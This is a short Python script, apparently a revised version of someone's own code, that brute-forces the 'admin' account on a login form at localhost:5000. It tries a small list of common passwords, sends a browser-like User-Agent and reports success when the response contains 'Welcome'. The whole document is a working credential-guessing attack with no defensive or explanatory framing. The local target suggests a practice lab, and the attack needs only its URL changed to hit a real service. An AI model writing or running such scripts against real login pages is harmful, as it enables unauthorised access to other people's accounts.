import requests

URL = "http://localhost:5000/login"
PASSWORDS = ["123456", "password", "admin123", "letmein", "qwerty"]

# Optional headers to look more "browser-like"
HEADERS = {"User-Agent": "Mozilla/5.0 (BruteScript)"}

for pwd in PASSWORDS:
    data = {"username": "admin", "password": pwd}
    try:
        r = requests.post(URL, data=data, headers=HEADERS, timeout=5)
    except requests.RequestException as e:
        print(f"[ERROR] Request failed for {pwd}: {e}")
        break

    # Debug: show HTTP status and small snippet of response
    snippet = (r.text or "")[:200].replace("\n", " ")
    print(f"[{r.status_code}] Tried '{pwd}' -> {snippet!s}")

    # your original check
    if "Welcome" in r.text or "Welcome!" in r.text:
        print(f"Password found: {pwd}")
        break
else:
    print("Exhausted password list — none matched.")
